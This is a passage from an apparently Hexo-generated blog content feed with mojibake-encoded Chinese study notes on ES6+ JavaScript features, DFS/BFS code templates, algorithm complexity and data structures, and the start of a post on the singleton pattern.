æ­¤æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œå¯ä»¥å¯¹å¤–ç•Œçš„è®¿é—®è¿›è¡Œè¿‡æ»¤å’Œæ”¹å†™ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span> (<span class="params">target, propKey, receiver</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`getting <span class="subst">$&#123;propKey&#125;</span>!`</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, propKey, receiver);</span><br><span class="line">  &#125;,</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span> (<span class="params">target, propKey, value, receiver</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`setting <span class="subst">$&#123;propKey&#125;</span>!`</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, propKey, value, receiver);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="12-Reflect"><a href="#12-Reflect" class="headerlink" title="12. Reflect"></a>12. Reflect</h3><p>æ¯ä¸€ä¸ªProxyå¯¹è±¡çš„æ‹¦æˆªæ“ä½œï¼ˆgetã€deleteã€hasï¼‰ï¼Œå†…éƒ¨éƒ½è°ƒç”¨å¯¹åº”çš„Reflectæ–¹æ³•ï¼Œä¿è¯åŸç”Ÿè¡Œä¸ºèƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œã€‚</p><p><br></p><h3 id="10-ES8"><a href="#10-ES8" class="headerlink" title="10. ES8"></a>10. ES8</h3><h4 id="10-1-async-await"><a href="#10-1-async-await" class="headerlink" title="10.1 async/await"></a>10.1 async/await</h4><h4 id="10-2-Object-values-Object-entries"><a href="#10-2-Object-values-Object-entries" class="headerlink" title="10.2 Object.values() / Object.entries()"></a>10.2 Object.values() / Object.entries()</h4><p><br></p><h3 id="11-ES2020"><a href="#11-ES2020" class="headerlink" title="11. ES2020"></a>11. ES2020</h3><h4 id="11-1-å¯é€‰é“¾æ“ä½œç¬¦"><a href="#11-1-å¯é€‰é“¾æ“ä½œç¬¦" class="headerlink" title="11.1  ?. å¯é€‰é“¾æ“ä½œç¬¦"></a>11.1  <em><code>?.</code></em> å¯é€‰é“¾æ“ä½œç¬¦</h4><p>å½“è®¿é—®å¯¹è±¡å±æ€§æ—¶ï¼Œå¦‚æœä¸­é—´æœ‰nullæˆ–undefinedï¼Œä¼šçŸ­è·¯è¿”å›undefinedï¼Œä¸ä¼šç»§ç»­å¾€ä¸‹èµ°ï¼Œä¹Ÿä¸ä¼šæŠ›å‡ºé”™è¯¯ã€‚<br>ä¾‹å¦‚ï¼Œ<code>user?.profile?.name</code>ï¼Œå¦‚æœuserä¸ºnullæˆ–undefinedï¼Œæ•´ä¸ªè¡¨è¾¾å¼è¿”å›undefinedï¼Œä¸ä¼šç»§ç»­è®¿é—®<code>profile</code>ã€‚</p><h4 id="11-2-ç©ºå€¼åˆå¹¶æ“ä½œç¬¦"><a href="#11-2-ç©ºå€¼åˆå¹¶æ“ä½œç¬¦" class="headerlink" title="11.2 ?? ç©ºå€¼åˆå¹¶æ“ä½œç¬¦"></a>11.2 <em><code>??</code></em> ç©ºå€¼åˆå¹¶æ“ä½œç¬¦</h4><p>å·¦ä¾§æ˜¯nullæˆ–undefinedæ—¶æ‰è¿”å›å³ä¾§çš„å€¼<br><code>const name = user.name ?? &#39;Guest&#39;;</code>ï¼Œå¦‚æœuser.nameä¸å­˜åœ¨æˆ–ä¸ºnull/undefined</p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li>ã€Šæ·±å…¥ç†è§£ES6ã€‹NICHOLAS C.ZAKAS</li><li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="noopener">ã€ŠECMAScript6å…¥é—¨ã€‹ é˜®ä¸€å³°</a></li><li><a href="https://juejin.im/entry/579f5d1b1532bc00608caa9c" target="_blank" rel="noopener">ES6æ‰‹å†Œ</a></li><li><a href="https://www.jianshu.com/p/a680cc4e246d" target="_blank" rel="noopener">ES6è¯­æ³•</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” æ·±åº¦ä¼˜å…ˆæœç´¢ã€å¹¿åº¦ä¼˜å…ˆæœç´¢</title>
      <link href="/2020/08/23/LeetCode-%E9%80%92%E5%BD%92/"/>
      <url>/2020/08/23/LeetCode-%E9%80%92%E5%BD%92/</url>
      <content type="html"><![CDATA[<h3 id="1-ä»£ç æ¨¡æ¿"><a href="#1-ä»£ç æ¨¡æ¿" class="headerlink" title="1. ä»£ç æ¨¡æ¿"></a>1. ä»£ç æ¨¡æ¿</h3><ul><li>æ¯ä¸ªèŠ‚ç‚¹æœ‰ä¸”ä»…è®¿é—®ä¸€æ¬¡</li><li>è®¿é—®èŠ‚ç‚¹çš„é¡ºåºä¸åŒå¯åˆ†ä¸ºBFS, DFS</li></ul><h4 id="1-1-é€’å½’é€šç”¨æ¨¡æ¿"><a href="#1-1-é€’å½’é€šç”¨æ¨¡æ¿" class="headerlink" title="1.1 é€’å½’é€šç”¨æ¨¡æ¿"></a>1.1 é€’å½’é€šç”¨æ¨¡æ¿</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> recursion = (level, params) &#123;</span><br><span class="line">  <span class="comment">// recursion terminator ç»ˆæ­¢æ¡ä»¶</span></span><br><span class="line">  <span class="keyword">if</span> (level &gt; MAX_LEVEL) &#123;</span><br><span class="line">    process_result</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// process current level</span></span><br><span class="line">  process(level, params)</span><br><span class="line">  <span class="comment">// drill down</span></span><br><span class="line">  recursion(level + <span class="number">1</span>, parms)</span><br><span class="line">  <span class="comment">// clean current level status if need</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-1-DFS-æ·±åº¦ä¼˜å…ˆæœç´¢"><a href="#1-1-DFS-æ·±åº¦ä¼˜å…ˆæœç´¢" class="headerlink" title="1.1 DFS æ·±åº¦ä¼˜å…ˆæœç´¢"></a>1.1 DFS æ·±åº¦ä¼˜å…ˆæœç´¢</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€’å½’å†™æ³•</span></span><br><span class="line"><span class="keyword">const</span> visited = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line"><span class="keyword">const</span> dfs = <span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (visited.has(node)) <span class="keyword">return</span></span><br><span class="line">  visited.add(node)</span><br><span class="line">  dfs(node.left)</span><br><span class="line">  dfs(node.right)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éé€’å½’å†™æ³•</span></span><br><span class="line"><span class="keyword">const</span> dfs = <span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">const</span> visited = []</span><br><span class="line">  <span class="keyword">const</span> stack = node</span><br><span class="line">  <span class="keyword">while</span> (stack.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> node = stack.pop()</span><br><span class="line">    visited.push(node)</span><br><span class="line">    process(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> nodes = generate_related_nodes(node)</span><br><span class="line">    stack.push(nodes)</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-BFS-å¹¿åº¦ä¼˜å…ˆæœç´¢"><a href="#1-2-BFS-å¹¿åº¦ä¼˜å…ˆæœç´¢" class="headerlink" title="1.2 BFS å¹¿åº¦ä¼˜å…ˆæœç´¢"></a>1.2 BFS å¹¿åº¦ä¼˜å…ˆæœç´¢</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bfs = <span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> result = []</span><br><span class="line">  <span class="keyword">const</span> queue = [root]</span><br><span class="line">  <span class="keyword">while</span> (queue.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> level = []</span><br><span class="line">    <span class="keyword">const</span> n = queue.length</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> node = queue.pop()</span><br><span class="line">      level.push(node.val)</span><br><span class="line">      <span class="keyword">if</span> (node.left) queue.unshift(node.left)</span><br><span class="line">      <span class="keyword">if</span> (node.right) queue.unshift(node.right)</span><br><span class="line">    &#125;</span><br><span class="line">    result.push(level)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ç”¨é€”"><a href="#2-ç”¨é€”" class="headerlink" title="2. ç”¨é€”"></a>2. ç”¨é€”</h3><h4 id="2-1-å­é›†"><a href="#2-1-å­é›†" class="headerlink" title="2.1 å­é›†"></a>2.1 å­é›†</h4><h4 id="2-2-ç»„åˆ"><a href="#2-2-ç»„åˆ" class="headerlink" title="2.2 ç»„åˆ"></a>2.2 ç»„åˆ</h4><h4 id="2-3-æ’åˆ—"><a href="#2-3-æ’åˆ—" class="headerlink" title="2.3 æ’åˆ—"></a>2.3 æ’åˆ—</h4>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ç®—æ³•</title>
      <link href="/2020/08/14/%E7%AE%97%E6%B3%95/"/>
      <url>/2020/08/14/%E7%AE%97%E6%B3%95/</url>
      <content type="html"><![CDATA[<ol start="0"><li>æ•°æ®ç»“æ„</li></ol><ul><li>ä¸€ç»´<br>  Â· åŸºç¡€ï¼šæ•°ç»„ array, string, é“¾è¡¨ linked list<br>  Â· é«˜çº§: æ ˆ stackï¼Œ é˜Ÿåˆ— queueï¼Œ åŒç«¯é˜Ÿåˆ— deque, é›†åˆ set, æ˜ å°„ map(hash or map)</li><li>äºŒç»´<br>  Â· åŸºç¡€: æ ‘ tree, å›¾ graph<br>  Â· é«˜çº§: äºŒå‰æœç´¢æ ‘ binary search tree(red-black tree, AVL), å †heapï¼Œå¹¶æŸ¥é›†disjoint set, å­—å…¸æ ‘ Trie</li><li>ç‰¹æ®Š<br>  Â· ä½è¿ç®— Bitwiseï¼Œ å¸ƒéš†è¿‡æ»¤å™¨ BloomFilter<br>  Â· LRU Cache</li></ul><ol start="0"><li>ç®—æ³•<br>ä»»ä½•çš„é«˜çº§ç®—æ³•æœ€åéƒ½ä¼šè½¬æ¢ä¸ºif-else, for loopå’Œé€’å½’è¿™ä¸‰ç§æœ€æœ´ç´ çš„è¿ç®—æ“ä½œ</li></ol><ul><li>if-else, switch -&gt; branch</li><li>for, while loop -&gt; iteration</li><li>é€’å½’Recursion(Divide &amp; Conquer, Backtrace)</li><li>æœç´¢Search: æ·±åº¦ä¼˜å…ˆæœç´¢ Depth first search, å¹¿åº¦ä¼˜å…ˆæœç´¢ Breadth first search, A*</li><li>åŠ¨æ€è§„åˆ’ Dynamic Programming</li><li>äºŒåˆ†æŸ¥æ‰¾ Binary Search</li><li>è´ªå¿ƒ Greedy</li><li>æ•°å­¦ Math, å‡ ä½• Geometry<br>æ³¨æ„ï¼šåœ¨å¤´è„‘ä¸­å›å¿†ä¸Šé¢æ¯ç§ç®—æ³•çš„æ€æƒ³å’Œä»£ç æ¨¡æ¿</li></ul><ol><li>æ—¶é—´å¤æ‚åº¦ï¼šæ ¹æ®nçš„æƒ…å†µä¼šè¿è¡Œå¤šå°‘æ¬¡<br>å¸¸è§çš„7ç§å¤æ‚åº¦ï¼Œåªçœ‹æœ€é«˜å¤æ‚åº¦çš„è¿ç®—<br>O(1): å¸¸æ•°å¤æ‚åº¦<br>O(log n): å¯¹æ•°å¤æ‚åº¦<br>O(n): çº¿æ€§æ—¶é—´å¤æ‚åº¦<br>O(n^2): å¹³æ–¹<br>O(n^3): ç«‹æ–¹<br>O(n!): é˜¶ä¹˜<br>O(2^n): æŒ‡æ•°ï¼›æ¯å¤šå±•å¼€ä¸€å±‚ï¼Œè¿è¡Œçš„èŠ‚ç‚¹æ•°æ˜¯ä¸Šä¸€å±‚çš„ä¸¤å€ã€‚ç¬¬ä¸€å±‚æœ‰1ä¸ªèŠ‚ç‚¹ï¼Œç¬¬äºŒå±‚æœ‰2ä¸ªèŠ‚ç‚¹ï¼Œç¬¬ä¸‰å±‚æœ‰4ä¸ªèŠ‚ç‚¹ï¼Œå®ƒçš„è¿è¡Œæ¬¡æ•°æ˜¯æŒ‰æŒ‡æ•°çº§é€’å¢çš„ã€‚æ‰€ä»¥å½“ä½ ä¸‹åˆ°æœ€åä¸€å±‚ï¼Œå¤§æ¦‚æ˜¯2^nä¸ªèŠ‚ç‚¹ã€‚<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">2</span>) <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>åœ¨é€’å½’çš„æƒ…æ™¯ï¼Œä¸€èˆ¬æœ‰4ç§å¸¸è§æƒ…å†µï¼š</p><ul><li>äºŒåˆ†æŸ¥æ‰¾Binary Search: ä¸€èˆ¬å‘ç”Ÿåœ¨ä¸€ä¸ªæœ‰åºæ•°åˆ—é‡Œï¼Œä½ è¦åœ¨é‡Œé¢æ‰¾åˆ°ä½ çš„ç›®æ ‡æ•°ï¼Œå®ƒæ¯æ¬¡éƒ½ä¸€åˆ†ä¸ºäºŒï¼ŒåªæŸ¥ä¸€éå°±ä¸‹å»äº†ã€‚æ‰€ä»¥æ—¶é—´å¤æ‚åº¦æ˜¯O(log n)</li><li>äºŒå‰æ ‘æŸ¥æ‰¾ï¼šæˆ‘ä»¬ä¼šæ¯ä¸ªèŠ‚ç‚¹éƒ½è®¿é—®ä¸€æ¬¡ï¼Œä¸”ä»…è®¿é—®ä¸€æ¬¡ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‚nä»£è¡¨æ ‘é‡Œé¢çš„èŠ‚ç‚¹æ€»æ•°</li><li>äºŒç»´çŸ©é˜µ: æœ‰åºçš„äºŒç»´çŸ©é˜µä¸­è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼ŒO(n)</li><li>å½’å¹¶æ’åºï¼šæœ€ä¼˜çš„è§£å†³æ–¹æ³• O(n log n)</li></ul><ol start="2"><li><p>ç©ºé—´å¤æ‚åº¦<br>ä¸»è¦çœ‹æ•°ç»„çš„é•¿åº¦ï¼Œé€’å½’çš„æ·±åº¦</p></li><li><p>æ•°ç»„ï¼Œé“¾è¡¨ï¼Œè·³è¡¨<br>å¦‚æœå¯¹ArrayListè¿›è¡Œå¤§é‡çš„ä¿®æ”¹æ“ä½œï¼Œå®ƒä¼šæ¶‰åŠåˆ°éå¸¸å¤šçš„array copyï¼ŒæŠŠæ•°ç»„çš„ç‰‡æ®µå¤åˆ¶æ¥å¤åˆ¶å»ï¼Œæ¯”è¾ƒä½æ•ˆã€‚è€ŒLinkedListé“¾è¡¨ï¼Œè¿™ä¸ªæ•°æ®ç»“æ„æ˜¯ä¸ºäº†å¼¥è¡¥æ•°ç»„çš„è¿™ä¸ªç¼ºç‚¹ï¼Œåœ¨æ•°æ®ä¿®æ”¹å¢åˆ æ¯”è¾ƒé¢‘ç¹çš„æƒ…å†µä¸‹ï¼Œæ•°ç»„å…¶å®å¹¶ä¸å¥½ç”¨ã€‚è€ŒLinkedListå°±æ˜¯è¿™æ ·çš„å…ƒç´ ï¼Œæœ‰valueå’Œnextï¼Œ nextæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œä¸²åœ¨ä¸€èµ·å°±å˜æˆäº†ä¸€ä¸ªç±»ä¼¼äºæ•°ç»„çš„ç»“æ„ã€‚</p></li></ol><p>æ•°ç»„ æ—¶é—´å¤æ‚åº¦<br>prepend O(1) : æ­£å¸¸æƒ…å†µä¸‹æ•°ç»„çš„prependæ“ä½œçš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ï¼Œä½†æ˜¯å¯ä»¥ç‰¹æ®Šä¼˜åŒ–åˆ°O(1)ã€‚é‡‡ç”¨çš„æ–¹å¼æ˜¯ç”³è¯·ç¨å¤§ä¸€äº›çš„å†…å­˜ç©ºé—´ï¼Œç„¶åå†æ•°ç»„æœ€å¼€å§‹é¢„ç•™ä¸€éƒ¨åˆ†ç©ºé—´ï¼Œprependæ“ä½œæŠŠå¤´ä¸‹æ ‡å‰ç§»ä¸€ä¸ªä½ç½®å³å¯ã€‚<br>append O(1)<br>lookup O(1)<br>insert O(n)<br>delete O(n)</p><p>é“¾è¡¨ æ—¶é—´å¤æ‚åº¦<br>prepend O(1)<br>append O(1)<br>lookup O(n)<br>insert O(1)<br>delete O(1)</p><p>è·³è¡¨ Skip List<br>æ³¨æ„ï¼šåªèƒ½ç”¨äºæœ‰åºçš„é“¾è¡¨ã€‚è·³è¡¨ç”¨æ¥å–ä»£çš„æ˜¯å¹³è¡¡æ ‘å’ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œæ˜¯ä¸€ç§æ’å…¥/åˆ é™¤/æœç´¢éƒ½æ˜¯O(log n)çš„æ•°æ®ç»“æ„ã€‚</p><p>ç°å®ä¸­ï¼Œå®ƒä¼šç”±äºå…ƒç´ çš„å¢åŠ å’Œåˆ é™¤å¯¼è‡´å®ƒçš„ç´¢å¼•ï¼Œç»è¿‡å¤šæ¬¡å¢åŠ åˆ é™¤åï¼Œå®ƒæœ‰æ—¶ä¼šè·¨ä¸€æ­¥ï¼Œæœ‰æ—¶ä¼šè·¨ä¸¤æ­¥ï¼Œä¸æ˜¯éå¸¸çš„å·¥æ•´ã€‚è€Œä¸”å®ƒçš„ç»´æŠ¤æˆæœ¬ç›¸å¯¹æ¯”è¾ƒé«˜ï¼Œå½“ä½ å¢åŠ ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œä½ éœ€è¦æŠŠå®ƒçš„ç´¢å¼•æ›´æ–°ä¸€éã€‚å¯¼è‡´å®ƒçš„æ—¶é—´å¤æ‚åº¦å˜æˆO(log n)</p><p>é“¾è¡¨çš„ç©ºé—´å¤æ‚åº¦</p><ul><li>åŸå§‹é“¾è¡¨å¤§å°ä¸ºn,æ¯2ä¸ªç»“ç‚¹æŠ½1ä¸ªï¼Œæ¯å±‚ç´¢å¼•çš„ç»“ç‚¹æ•°n/2, n/4, n/8 â€¦ã€‚å› æ­¤ç©ºé—´å¤æ‚åº¦æ˜¯O(n)</li></ul><ol start="4"><li>æ ‘ï¼ŒäºŒå‰æ ‘ï¼ŒäºŒå‰æœç´¢æ ‘<br>ä¸ºä»€ä¹ˆæ ‘çš„è§£æ³•ä¸€èˆ¬æ˜¯é€’å½’ï¼Ÿ<br>æ ‘æœ¬èº«çš„å®šä¹‰ï¼Œæ²¡æœ‰åç»§çš„ç»“æ„ï¼Œæˆ–è€…ä¾¿äºå¾ªç¯çš„æœºæ„ï¼Œä½¿å…¶æ²¡æ³•æœ‰æ•ˆç¬¬è¿›è¡Œæ‰€è°“çš„å¾ªç¯ã€‚æ ‘åªæœ‰å·¦èŠ‚ç‚¹å’Œå³èŠ‚ç‚¹ï¼Œå› æ­¤å½“ä½ éœ€è¦å»è®¿é—®å®ƒçš„å­æ ‘æ—¶ï¼Œæ›´å¥½çš„æ–¹å¼ï¼Œæ˜¯ç›´æ¥å¯¹å®ƒçš„å·¦èŠ‚ç‚¹è°ƒç”¨ç›¸åŒçš„éå†å‡½æ•°ã€‚</li></ol><p>äºŒå‰æœç´¢æ ‘ï¼šä¹Ÿç§°äºŒå‰æ’åºæ ‘ï¼Œæœ‰åºäºŒå‰æ ‘ï¼Œæ’åºäºŒå‰æ ‘ï¼Œæ˜¯æŒ‡ä¸€æ£µç©ºæ ‘æˆ–è€…å…·æœ‰ä¸‹åˆ—æ€§è´¨çš„äºŒå‰æ ‘ï¼š</p><ul><li>å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹èŠ‚ç‚¹çš„å€¼ï¼›</li><li>å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºå®ƒçš„æ ¹èŠ‚ç‚¹çš„å€¼ï¼›</li><li>ä»¥æ­¤ç±»æ¨ï¼šå·¦ã€å³å­æ ‘ä¹Ÿåˆ†åˆ«ä¸ºäºŒå‰æŸ¥æ‰¾æ ‘</li></ul><p>æ’å…¥ï¼ŒæŸ¥è¯¢æ“ä½œéƒ½æ˜¯O(log n)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‰åºéå†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        self path.append(root val)</span><br><span class="line">        self preorder(root left)</span><br><span class="line">        self preorder(root right)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸­åºéå†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inorder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        self inorder(root left)</span><br><span class="line">        self path.append(root val)</span><br><span class="line">        self inorder(root right)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ååºéå†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backorder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        self backorder(root left)</span><br><span class="line">        self backorder(root right)</span><br><span class="line">        self path.append(root val)</span><br></pre></td></tr></table></figure></p><ol start="5"><li>é€’å½’çš„å®ç°ã€ç‰¹æ€§ä»¥åŠæ€ç»´è¦ç‚¹<br>é€’å½’ - å¾ªç¯ï¼Œé€šè¿‡å‡½æ•°ä½“æ¥è¿›è¡Œçš„å¾ªç¯ã€‚ä¹‹å‰æœ‰ä¸€æ®µå‡½æ•°ï¼Œæˆ–è€…ä¸€æ®µæŒ‡ä»¤å†™åœ¨æŸä¸ªåœ°æ–¹ï¼Œå°±ç›´æ¥ä¸æ–­åœ°åå¤è·³åˆ°ä¹‹å‰é‚£æ®µæŒ‡ä»¤ï¼Œä¸æ–­åœ°æ‰§è¡Œã€‚<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def Factorial(n):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * Factorial(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursion</span><span class="params">(level, param1, param2, ...)</span>:</span></span><br><span class="line">    <span class="comment"># recursion terminator é€’å½’ç»ˆç»“æ¡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> level &gt; MAX_LEVEL:</span><br><span class="line">        process_result</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># process login in current level å¤„ç†å½“å‰å±‚çš„è·¯åŸº</span></span><br><span class="line">    process(level, data...)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># drill down ä¸‹æ¢åˆ°ä¸‹ä¸€å±‚</span></span><br><span class="line">    recursion(level + <span class="number">1</span>, p1 ...)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reverse the current level status if needed æ¸…ç†å½“å‰å±‚</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>è®¾è®¡æ¨¡å¼</title>
      <link href="/2020/07/11/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2020/07/11/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h3 id="1-å•ä¾‹æ¨¡å¼"><a href="#1-å•ä¾‹æ¨¡å¼" class="headerlink" title="1. å•ä¾‹æ¨¡å¼"></a>1. å•ä¾‹æ¨¡å¼</h3><p>å•ä¾‹æ¨¡å¼ï¼Œä¸€ä¸ªç±»åªå…è®¸åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚å•ä¾‹æ¨¡å¼çš„åº”ç”¨åœºæ™¯ï¼Œä¸€èˆ¬ä¸ºäº†é¿å…èµ„æºè®¿é—®å†²çªã€è¡¨ç¤ºä¸šåŠ¡æ¦‚å¿µä¸Šçš„å…¨å±€å”¯ä¸€ç±»ã€‚</p><p>å•ä¾‹å®ç°çš„æ–¹å¼</p><ul><li>é¥¿æ±‰å¼ï¼š åœ¨ç±»åŠ è½½æœŸé—´ï¼Œå°±å·²ç»å°†instanceé™æ€å®ä¾‹åˆå§‹åŒ–å¥½äº†ã€‚å› æ­¤ä¸æ”¯æŒå»¶è¿ŸåŠ è½½å®ä¾‹</li><li>æ‡’æ±‰å¼ï¼š æ”¯æŒå»¶è¿ŸåŠ è½½ï¼Œä½†æ˜¯ä¼šå¯¼è‡´é¢‘ç¹åŠ é”ï¼Œé‡Šæ”¾é”ï¼Œé¢‘ç¹çš„è°ƒç”¨ä¼šäº§ç”Ÿæ€§èƒ½ç“¶é¢ˆ</li><li>åŒé‡æ£€æµ‹ï¼šæ—¢æ”¯æŒå»¶è¿ŸåŠ è½½ï¼Œåˆæ”¯æŒé«˜å¹¶å‘ã€‚åªè¦instanceè¢«åˆ›å»ºåï¼Œå†æ¬¡è°ƒç”¨getInstanceå°±ä¸ä¼šè¿›å…¥åŠ é”é€»è¾‘ä¸­</li></ul><p>å•ä¾‹æ¨¡å¼çš„é—®é¢˜</p><ul><li>å¯¹ç»§æ‰¿ã€å¤šæ€çš„æ”¯æŒä¸å‹å¥½</li><li>å•ä¾‹ç±»ä¸æ”¯æŒæœ‰å‚æ•°çš„æ„é€ å‡½æ•°ã€‚è§£å†³æ–¹æ³•ï¼šâ‘ åˆ›å»ºå®Œå®ä¾‹åï¼Œå†è°ƒç”¨initå‡½æ•°ä¼ 